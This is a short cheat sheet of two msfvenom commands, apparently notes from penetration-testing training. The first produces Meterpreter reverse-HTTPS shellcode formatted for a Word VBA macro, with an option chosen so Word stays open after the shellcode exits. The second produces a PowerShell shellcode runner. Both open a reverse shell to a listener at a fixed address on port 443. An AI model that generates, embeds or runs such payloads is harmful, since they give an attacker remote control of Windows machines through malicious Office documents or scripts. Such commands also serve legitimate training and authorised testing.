#Generates shellcode formatted as VBapplication for staging Meterpreter shell. EXITFUNC=thread ensures Word doesn't close when the shellcode exits.
`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication`

#Generates shellcode runner for powershell. 
`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1`
